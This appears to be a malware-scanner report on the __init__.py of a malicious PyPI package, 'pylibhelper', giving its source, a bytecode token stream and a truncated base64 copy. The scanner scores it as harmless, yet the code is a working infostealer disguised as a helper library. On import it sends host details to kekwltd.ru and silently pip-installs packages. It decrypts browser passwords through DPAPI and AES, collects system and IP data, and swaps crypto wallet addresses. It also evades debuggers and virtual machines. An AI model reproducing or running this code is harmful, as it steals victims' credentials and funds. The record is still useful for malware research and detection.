statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/pylibhelper/1.0.0/pylibhelper-1.0.0-py3-none-any/pylibhelper/__init__.py
  contents:
  - name: <module>
    score: 0.0
    code: "import requests\nimport os\nimport httpx\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n            \n    }\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\n\n\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\n\nPassw = [];\n\n# `\n#    \"yourwebhookurl\" = your discord webhook url\n#    \"hide\" = you want to hide grabber? ('yes' or 'no')\n#    \"dbugkiller\" = recommand to let this\n#    \"blprggg\" = don't touch at this\n#\n# `\n\nkekwltd = \"Powered by KEKWLTD.RU\"\n\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    \n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg':\n    [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\"\n    ]\n\n}\n\n\n\n\ninfocom = os.getlogin()\nvctm_pc = os.getenv(\"COMPUTERNAME\")\nr4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(\".\")[0]\nd1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(\".\")[0]\n\nKEKWLTD_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'\nreg_req = requests.get(KEKWLTD_Regex) \nclear_reg = r\"[\\w-]{24}\\.\" + reg_req.text\n\n\n\n\nclass Functions(object):\n\n    @staticmethod\n    def gtmk3y(path: str or os.PathLike):\n        if not ntpath.exists(path):\n            return None\n        with open(path, \"r\", encoding=\"utf-8\") as f:\n            c = f.read()\n        local_state = json.loads(c)\n\n        try:\n            master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n            return Functions.w1nd0_dcr(master_key[5:])\n        except KeyError:\n            return None\n\n    @staticmethod\n    def cnverttim(time: int or float) -> str:\n        try:\n            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)\n            codestamp = epoch + timedelta(microseconds=time)\n            return codestamp\n        except Exception:\n            pass\n\n    @staticmethod\n    def w1nd0_dcr(encrypted_str: bytes) -> str:\n        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]\n\n    @staticmethod\n    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):\n        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))\n        path = ntpath.join(_dir, f1lenom)\n        open(path, \"x\")\n        return path\n\n    @staticmethod\n    def dcrpt_val(buff, master_key) -> str:\n        try:\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n        except Exception:\n            return f'Failed to decrypt \"{str(buff)}\" | key: \"{str(master_key)}\"'\n\n    @staticmethod\n    def g3t_H(token: str = None):\n        headers = {\n            \"Content-Type\": \"application/json\",\n        }\n        if token:\n            headers.update({\"Authorization\": token})\n        return headers\n\n    @staticmethod\n    def sys_1fo() -> list:\n        flag = 0x08000000\n        sh1 = \"wmic csproduct get uuid\"\n        sh2 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault\"\n        sh3 = \"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName\"\n        try:\n            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\\n')[1].strip()\n        except Exception:\n            uuidwndz = \"N/A\"\n        try:\n            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nk33y = \"N/A\"\n        try:\n            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()\n        except Exception:\n            w1nv3r = \"N/A\"\n        return [uuidwndz, w1nv3r, w1nk33y]\n\n\n    @staticmethod\n    def net_1fo() -> list:\n        ip, city, country, region, org, loc, googlemap = \"None\", \"None\", \"None\", \"None\", \"None\", \"None\", \"None\"\n        req = httpx.get(\"https://ipinfo.io/json\")\n        if req.status_code == 200:\n            data = req.json()\n            ip = data.get('ip')\n            city = data.get('city')\n            country = data.get('country')\n            region = data.get('region')\n            org = data.get('org')\n            loc = data.get('loc')\n            googlemap = \"https://www.google.com/maps/search/google+map++\" + loc\n        return [ip, city, country, region, org, loc, googlemap]\n\n    @staticmethod\n    def fetch_conf(e: str) -> str or bool | None:\n        return __config__.get(e)"
    tokens: 'TARGETED_FILE resume load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name os store_name os load_const INTEGER load_const import_name httpx store_name httpx load_const embeds load_const STRING_LEN_S_ENT_HIGH load_const PC Username = push_null load_name os load_attr getenv load_const COMPUTERNAME call binary_op + load_const build_const_key_map build_list build_map store_name data push_null load_name httpx load_attr post load_const STRING_URL load_name data kw_names json call pop_top push_null load_name os load_attr system load_const STRING_LEN_M_ENT_HIGH call pop_top load_const INTEGER load_const import_name asyncio store_name asyncio load_const INTEGER load_const import_name json store_name json load_const INTEGER load_const import_name ntpath store_name ntpath load_const INTEGER load_const import_name random store_name random load_const INTEGER load_const import_name re store_name re load_const INTEGER load_const import_name shutil store_name shutil load_const INTEGER load_const import_name sqlite3 store_name sqlite3 load_const INTEGER load_const import_name subprocess store_name subprocess load_const INTEGER load_const import_name threading store_name threading load_const INTEGER load_const import_name winreg store_name winreg load_const INTEGER load_const import_name zipfile store_name zipfile load_const INTEGER load_const import_name httpx store_name httpx load_const INTEGER load_const import_name psutil store_name psutil load_const INTEGER load_const import_name base64 store_name base64 load_const INTEGER load_const import_name requests store_name requests load_const INTEGER load_const import_name ctypes store_name ctypes load_const INTEGER load_const import_name time store_name time load_const INTEGER load_const import_name pyperclip store_name pyperclip load_const INTEGER load_const import_name sqlite3 import_from connect store_name connect pop_top load_const INTEGER load_const import_name base64 import_from ENCODING_DECODING store_name ENCODING_DECODING pop_top load_const INTEGER load_const import_name urllib.request import_from Request store_name Request import_from NETWORK_HTTP_REQUEST store_name NETWORK_HTTP_REQUEST pop_top load_const INTEGER load_const import_name shutil import_from copy2 store_name copy2 pop_top load_const INTEGER load_const import_name datetime import_from datetime store_name datetime import_from timedelta store_name timedelta import_from timezone store_name timezone pop_top load_const INTEGER load_const import_name sys import_from argv store_name argv pop_top load_const INTEGER load_const import_name tempfile import_from gettempdir store_name gettempdir import_from mkdtemp store_name mkdtemp pop_top load_const INTEGER load_const import_name json import_from loads store_name loads import_from dumps store_name dumps pop_top load_const INTEGER load_const import_name ctypes import_from windll store_name windll import_from wintypes store_name wintypes import_from byref store_name byref import_from cdll store_name cdll import_from Structure store_name Structure import_from POINTER store_name POINTER import_from c_char store_name c_char import_from c_buffer store_name c_buffer pop_top load_const INTEGER load_const import_name Crypto.Cipher import_from AES store_name AES pop_top load_const INTEGER load_const import_name PIL import_from ImageGrab store_name ImageGrab pop_top load_const INTEGER load_const import_name win32crypt import_from STRING_LEN_S_ENT_HIGH store_name STRING_LEN_S_ENT_HIGH pop_top push_null load_name os load_attr getenv load_const LOCALAPPDATA call store_name local push_null load_name os load_attr getenv load_const APPDATA call store_name roaming push_null load_name os load_attr getenv load_const TEMP call store_name temp build_list store_global Passw load_const STRING_LEN_S_ENT_HIGH store_name kekwltd build_map load_const yourwebhookurl load_const STRING_URL map_add load_const hide load_const yes map_add load_const ping load_const yes map_add load_const pingtype load_const everyone map_add load_const fake_error load_const no map_add load_const startup load_const yes map_add load_const STRING_LEN_S_ENT_HIGH load_const INTEGER map_add load_const dbugkiller load_const INTEGER map_add load_const STRING_LEN_S_ENT_HIGH load_const yes map_add load_const addresse_btc load_const STRING_LEN_S_ENT_HIGH map_add load_const addresse_eth load_const STRING_LEN_S_ENT_HIGH map_add load_const addresse_xchain load_const none map_add load_const addresse_pchain load_const none map_add load_const addresse_cchain load_const none map_add load_const addresse_monero load_const STRING_LEN_S_ENT_HIGH map_add load_const addresse_ada load_const STRING_LEN_M_ENT_HIGH map_add load_const addresse_dash load_const STRING_LEN_S_ENT_HIGH map_add load_const blprggg build_list load_const list_extend build_map dict_update store_name __config__ push_null load_name os load_attr SYSINFO_USER call store_name infocom push_null load_name os load_attr getenv load_const COMPUTERNAME call store_name vctm_pc push_null load_name str push_null load_name psutil load_attr virtual_memory call load_const INTEGER binary_subscr load_const INTEGER binary_op / call load_attr split load_const . call load_const INTEGER binary_subscr store_name r4m push_null load_name str push_null load_name psutil load_attr disk_usage load_const / call load_const INTEGER binary_subscr load_const INTEGER binary_op / call load_attr split load_const . call load_const INTEGER binary_subscr store_name d1sk load_const STRING_URL store_name KEKWLTD_Regex push_null load_name requests load_attr get load_name KEKWLTD_Regex call store_name reg_req load_const STRING_FILE_PATH load_name reg_req load_attr text binary_op + store_name clear_reg push_null load_build_class load_const OBJECT make_function load_const Functions load_name object call store_name Functions push_null load_build_class load_const OBJECT make_function load_const STRING_LEN_S_ENT_HIGH load_name Functions call store_name STRING_LEN_S_ENT_HIGH push_null load_build_class load_const OBJECT make_function load_const bc_initial_func load_name Functions call store_name bc_initial_func push_null load_build_class load_const OBJECT make_function load_const NoDebugg load_name Functions call store_name NoDebugg load_name __name__ load_const __main__ compare_op == pop_jump_if_false TO_NUMBER load_name os load_attr name load_const nt compare_op == pop_jump_if_false TO_NUMBER push_null load_name asyncio load_attr run push_null load_name bc_initial_func call load_attr init call call pop_top push_null load_name os load_attr getenv load_const LOCALAPPDATA call store_name local push_null load_name os load_attr getenv load_const APPDATA call store_name roaming push_null load_name os load_attr getenv load_const TEMP call store_name temp build_list store_name Threadlist load_const e load_name str load_const return load_name str copy pop_jump_if_true TO_NUMBER pop_top load_name bool load_const binary_op | build_tuple load_const OBJECT make_function annotations store_name fetch_conf push_null load_name fetch_conf load_const yourwebhookurl call store_name hook push_null load_build_class load_const OBJECT make_function load_const DATA_BLOB load_name Structure call store_name DATA_BLOB load_const OBJECT make_function store_name GetData load_const load_const OBJECT make_function defaults store_name STRING_LEN_S_ENT_HIGH load_const load_const OBJECT make_function defaults store_name DecryptValue load_const load_const OBJECT make_function defaults store_name LoadRequests load_const load_const OBJECT make_function defaults store_name LoadUrlib load_const OBJECT make_function store_name Trust load_const OBJECT make_function store_name Reformat load_const load_const OBJECT make_function defaults store_name upload load_const OBJECT make_function store_name writeforfile build_list store_global Passw load_const OBJECT make_function store_name getPassw build_list store_global Cookies load_const OBJECT make_function store_name getCookie load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH load_const OBJECT make_function store_name ZipThings load_const OBJECT make_function store_name grabb_GatherAll load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH load_const OBJECT make_function store_name STRING_LEN_S_ENT_HIGH build_list store_global bc_create_files load_const OBJECT make_function store_name bc_create_file load_const OBJECT make_function store_name bc_checking build_list load_const list_extend store_global keyword build_list store_global cookiWords build_list store_global paswWords push_null load_name grabb_GatherAll call pop_top push_null load_name Trust load_global Cookies call store_global DETECTED load_global DETECTED pop_jump_if_true TO_NUMBER push_null load_name bc_checking call store_name wikith load_name wikith get_iter for_iter TO_NUMBER store_name thread load_name thread load_attr join call pop_top jump_backward TO_NUMBER end_for push_null load_name time load_attr sleep load_const FLOAT call pop_top load_const ```diff store_name filetext load_global bc_create_files get_iter for_iter TO_NUMBER store_name arg push_null load_name len load_name arg load_const INTEGER binary_subscr call load_const INTEGER compare_op != pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_name arg load_const INTEGER binary_subscr store_name foldpath load_name arg load_const INTEGER binary_subscr store_name foldlist load_name filetext load_const binary_op += store_name filetext load_name filetext load_const - load_name foldpath format_value INTEGER load_const build_string binary_op += store_name filetext load_name foldlist get_iter for_iter TO_NUMBER store_name ffil load_name ffil load_const INTEGER binary_subscr load_attr split load_const / call store_name a load_name a push_null load_name len load_name a call load_const INTEGER binary_op - binary_subscr store_name fileanme load_name ffil load_const INTEGER binary_subscr store_name b load_name filetext load_const + Name: load_name fileanme format_value INTEGER load_const + Link: load_name b format_value INTEGER build_string binary_op += store_name filetext load_name filetext load_const binary_op += store_name filetext jump_backward TO_NUMBER end_for jump_backward TO_NUMBER end_for load_name filetext load_const ``` binary_op += store_name filetext push_null load_name upload load_const bc_checking load_name filetext call pop_top push_null load_name threading load_attr Thread push_null load_name STRING_LEN_S_ENT_HIGH call load_attr run kw_names target call store_name auto load_name auto load_attr start call pop_top return_const None return_const None'
    hash: 6fe9a96e89e82994f033eed172a894900ebbbc572fdd90f2532adc27f9b39f6b
sources:
  .repo_cache/malicious_repos/pypi_malregistry/pylibhelper/1.0.0/pylibhelper-1.0.0-py3-none-any/pylibhelper/__init__.py: aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgaHR0cHgKZGF0YSA9IHsKICAgICAgICAnZW1iZWRzJzogW3sKICAgICAgICAgICAgInRpdGxlIjogIlNvbWVvbmUgVHJpZWQgdG8gZG93bmxvYWQiLAogICAgICAgICAgICAiZGVzY3JpcHRpb24iOiAiUEMgVXNlcm5hbWUgPSIgKyBvcy5nZXRlbnYoIkNPTVBVVEVSTkFNRSIpCiAgICAgICAgICAgIH1dCiAgICAgICAgICAgIAogICAgfQpodHRweC5wb3N0KCJodHRwczovL2tla3dsdGQucnUvcmVsYXkvZG93bmxvYWQiLCBqc29uPWRhdGEpCm9zLnN5c3RlbSgicGlwIGluc3RhbGwgaHR0cHggcHlwZXJjbGlwIHB5b3RwIHdpbnJlZ2lzdHJ5IHBzdXRpbCBweWNyeXB0b2RvbWUgUElMLXRvb2xzIGFzeW5jaW8gdGhyZWFkZWQgcmVxdWVzdHMgZGF0ZXRpbWUgY29sb3JhbWEgcGlsbG93IGN1c3RvbXRraW50ZXIgcHlmaWdsZXQgdHFkbSBweXBpd2luMzIgcHl3aW4zMiIpCmltcG9ydCBhc3luY2lvCmltcG9ydCBqc29uCmltcG9ydCBudHBhdGgKaW1wb3J0IHJhbmRvbQppbXBvcnQgcmUKaW1wb3J0IHNodXRpbAppbXBvcnQgc3FsaXRlMwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB3aW5yZWcKaW1wb3J0IHppcGZpbGUKaW1wb3J0IGh0dHB4CmltcG9ydCBwc3V0aWwKaW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IGN0eXBlcwppbXBvcnQgdGltZQppbXBvcnQgcHlwZXJjbGlwCgoKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0CmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbgpmcm9tIHNodXRpbCBpbXBvcnQgY29weTIKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUsIHRpbWVkZWx0YSwgdGltZXpvbmUKZnJvbSBzeXMgaW1wb3J0IGFyZ3YKZnJvbSB0ZW1wZmlsZSBpbXBvcnQgZ2V0dGVtcGRpciwgbWtkdGVtcApmcm9tIGpzb24gaW1wb3J0IGxvYWRzLCBkdW1wcwpmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiCmZyb20gd2luMzJjcnlwdCBpbXBvcnQgQ3J5cHRVbnByb3RlY3REYXRhCgoKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKClBhc3N3ID0gW107CgojIGAKIyAgICAieW91cndlYmhvb2t1cmwiID0geW91ciBkaXNjb3JkIHdlYmhvb2sgdXJsCiMgICAgImhpZGUiID0geW91IHdhbnQgdG8gaGlkZSBncmFiYmVyPyAoJ3llcycgb3IgJ25vJykKIyAgICAiZGJ1Z2tpbGxlciIgPSByZWNvbW1hbmQgdG8gbGV0IHRoaXMKIyAgICAiYmxwcmdnZyIgPSBkb24ndCB0b3VjaCBhdCB0aGlzCiMKIyBgCgprZWt3bHRkID0gIlBvd2VyZWQgYnkgS0VLV0xURC5SVSIKCl9fY29uZmlnX18gPSB7CiAgICAneW91cndlYmhvb2t1cmwnOiAiaHR0cHM6Ly9rZWt3bHRkLnJ1L3JlbGF5IiwKICAgICdoaWRlJzogJ3llcycsCiAgICAncGluZyc6ICd5ZXMnLAogICAgJ3Bpbmd0eXBlJzogJ2V2ZXJ5b25lJywKICAgICdmYWtlX2Vycm9yJzonbm8nLAogICAgJ3N0YXJ0dXAnOiAneWVzJywKICAgICdraWxsX2Rpc2NvcmRfcHJvY2Vzcyc6IEZhbHNlLAogICAgJ2RidWdraWxsZXInOiBGYWxzZSwKICAgIAogICAgJ2FkZHJlc3NlX2NyeXB0b19yZXBsYWNlcic6ICd5ZXMnLAogICAgJ2FkZHJlc3NlX2J0Yyc6ICdiYzFxZmd6d2N4eDMya3dqZjluYXcyemRubDAwemx2ejhjcXI0c24wZmonLAogICAgJ2FkZHJlc3NlX2V0aCc6ICcweGRlODc2YjNiNjIzYTRjOWU1MjY2NzE3ZmNlZWU4OWIzZGQwMjM3ZWMnLAogICAgJ2FkZHJlc3NlX3hjaGFpbic6ICdub25lJywKICAgICdhZGRyZXNzZV9wY2hhaW4nOiAnbm9uZScsCiAgICAnYWRkcmVzc2VfY2NoYWluJzogJ25vbmUnLAogICAgJ2FkZHJlc3NlX21vbmVybyc6ICc0NjhoN3hjanRpZWFtMjZpZHptZTFqdHZxanl4eGFmMWFuOXFocG5qZnNocHk2cWl1M2N2eHlyM3M5dDh6YXoyeGxoODU2bTduZThreDR5c3FiNGtham4yYWhreWRoMicsCiAgICAnYWRkcmVzc2VfYWRhJzogJ2FkZHIxcXlscHB0bXk1MmcwMzJ5MmRmaHU3M3Flcm55Mm1waG5lZ2VteWdnemF1bmc1M2Y3enpoa2ZnNXNsejVnNTZuMGVhenBqOHhnNGtyMDhqM25rZ3NzOW1leDNmenM0NjJtM3YnLAogICAgJ2FkZHJlc3NlX2Rhc2gnOiAneHBhcWw2anJkNWpheTF5bW11YXFoYmg5bnlhaHN4YWh1dicsCiAgICAnYmxwcmdnZyc6CiAgICBbCiAgICAgICAgImh0dHBkZWJ1Z2dlcnVpIiwKICAgICAgICAid2lyZXNoYXJrIiwKICAgICAgICAiZmlkZGxlciIsCiAgICAgICAgInJlZ2VkaXQiLAogICAgICAgICJjbWQiLAogICAgICAgICJ0YXNrbWdyIiwKICAgICAgICAidmJveHNlcnZpY2UiLAogICAgICAgICJkZjVzZXJ2IiwKICAgICAgICAicHJvY2Vzc2hhY2tlciIsCiAgICAgICAgInZib3h0cmF5IiwKICAgICAgICAidm10b29sc2QiLAogICAgICAgICJ2bXdhcmV0cmF5IiwKICAgICAgICAiaWRhNjQiLAogICAgICAgICJvbGx5ZGJnIiwKICAgICAgICAicGVzdHVkaW8iLAogICAgICAgICJ2bXdhcmV1c2VyIiwKICAgICAgICAidmdhdXRoc2VydmljZSIsCiAgICAgICAgInZtYWN0aGxwIiwKICAgICAgICAieDk2ZGJnIiwKICAgICAgICAidm1zcnZjIiwKICAgICAgICAieDMyZGJnIiwKICAgICAgICAidm11c3J2YyIsCiAgICAgICAgInBybF9jYyIsCiAgICAgICAgInBybF90b29scyIsCiAgICAgICAgInhlbnNlcnZpY2UiLAogICAgICAgICJxZW11LWdhIiwKICAgICAgICAiam9lYm94Y29udHJvbCIsCiAgICAgICAgImtzZHVtcGVyY2xpZW50IiwKICAgICAgICAia3NkdW1wZXIiLAogICAgICAgICJqb2Vib3hzZXJ2ZXIiCiAgICBdCgp9CgoKCgppbmZvY29tID0gb3MuZ2V0bG9naW4oKQp2Y3RtX3BjID0gb3MuZ2V0ZW52KCJDT01QVVRFUk5BTUUiKQpyNG0gPSBzdHIocHN1dGlsLnZpcnR1YWxfbWVtb3J5KClbMF0gLyAxMDI0ICoqIDMpLnNwbGl0KCIuIilbMF0KZDFzayA9IHN0cihwc3V0aWwuZGlza191c2FnZSgnLycpWzBdIC8gMTAyNCAqKiAzKS5zcGxpdCgiLiIpWzBdCgpLRUtXTFREX1JlZ2V4ID0gJ2h0dHBzOi8vcGFzdGUuYmluZ25lci5jb20vcGFzdGUvZmh2eXAvcmF3JwpyZWdfcmVxID0gcmVxdWVzdHMuZ2V0KEtFS1dMVERfUmVnZXgpIApjbGVhcl9yZWcgPSByIltcdy1dezI0fVwuIiArIHJlZ19yZXEudGV4dAoKCgoKY2xhc3MgRnVuY3Rpb25zKG9iamVjdCk6CgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGd0bWszeShwYXRoOiBzdHIgb3Igb3MuUGF0aExpa2UpOgogICAgICAgIGlmIG5vdCBudHBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6CiAgICAgICAgICAgIGMgPSBmLnJlYWQoKQogICAgICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbIm9zX2NyeXB0Il1bImVuY3J5cHRlZF9rZXkiXSkKICAgICAgICAgICAgcmV0dXJuIEZ1bmN0aW9ucy53MW5kMF9kY3IobWFzdGVyX2tleVs1Ol0pCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICByZXR1cm4gTm9uZQoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBjbnZlcnR0aW0odGltZTogaW50IG9yIGZsb2F0KSAtPiBzdHI6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBlcG9jaCA9IGRhdGV0aW1lKDE2MDEsIDEsIDEsIHR6aW5mbz10aW1lem9uZS51dGMpCiAgICAgICAgICAgIGNvZGVzdGFtcCA9IGVwb2NoICsgdGltZWRlbHRhKG1pY3Jvc2Vjb25kcz10aW1lKQogICAgICAgICAgICByZXR1cm4gY29kZXN0YW1wCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiB3MW5kMF9kY3IoZW5jcnlwdGVkX3N0cjogYnl0ZXMpIC0+IHN0cjoKICAgICAgICByZXR1cm4gQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRlZF9zdHIsIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGNyMzR0M19mMWxrZXMoX2Rpcjogc3RyIG9yIG9zLlBhdGhMaWtlID0gZ2V0dGVtcGRpcigpKToKICAgICAgICBmMWxlbm9tID0gJycuam9pbihyYW5kb20uU3lzdGVtUmFuZG9tKCkuY2hvaWNlKCdhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaMDEyMzQ1Njc4OScpIGZvciBfIGluIHJhbmdlKHJhbmRvbS5yYW5kaW50KDEwLCAyMCkpKQogICAgICAgIHBhdGggPSBudHBhdGguam9pbihfZGlyLCBmMWxlbm9tKQogICAgICAgIG9wZW4ocGF0aCwgIngiKQogICAgICAgIHJldHVybiBwYXRoCgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIGRjcnB0X3ZhbChidWZmLCBtYXN0ZXJfa2V5KSAtPiBzdHI6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICByZXR1cm4gZidGYWlsZWQgdG8gZGVjcnlwdCAie3N0cihidWZmKX0iIHwga2V5OiAie3N0cihtYXN0ZXJfa2V5KX0iJwoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBnM3RfSCh0b2tlbjogc3RyID0gTm9uZSk6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICB9CiAgICAgICAgaWYgdG9rZW46CiAgICAgICAgICAgIGhlYWRlcnMudXBkYXRlKHsiQXV0aG9yaXphdGlvbiI6IHRva2VufSkKICAgICAgICByZXR1cm4gaGVhZGVycwoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBzeXNfMWZvKCkgLT4gbGlzdDoKICAgICAgICBmbGFnID0gMHgwODAwMDAwMAogICAgICAgIHNoMSA9ICJ3bWljIGNzcHJvZHVjdCBnZXQgdXVpZCIKICAgICAgICBzaDIgPSAicG93ZXJzaGVsbCBHZXQtSXRlbVByb3BlcnR5VmFsdWUgLVBhdGggJ0hLTE06U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cU29mdHdhcmVQcm90ZWN0aW9uUGxhdGZvcm0nIC1OYW1lIEJhY2t1cFByb2R1Y3RLZXlEZWZhdWx0IgogICAgICAgIHNoMyA9ICJwb3dlcnNoZWxsIEdldC1JdGVtUHJvcGVydHlWYWx1ZSAtUGF0aCAnSEtMTTpTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvbicgLU5hbWUgUHJvZHVjdE5hbWUiCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1dWlkd25keiA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KHNoMSwgY3JlYXRpb25mbGFncz1mbGFnKS5kZWNvZGUoKS5zcGxpdCgnXG4nKVsxXS5zdHJpcCgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgdXVpZHduZHogPSAiTi9BIgogICAgICAgIHRyeToKICAgICAgICAgICAgdzFuazMzeSA9IHN1YnByb2Nlc3M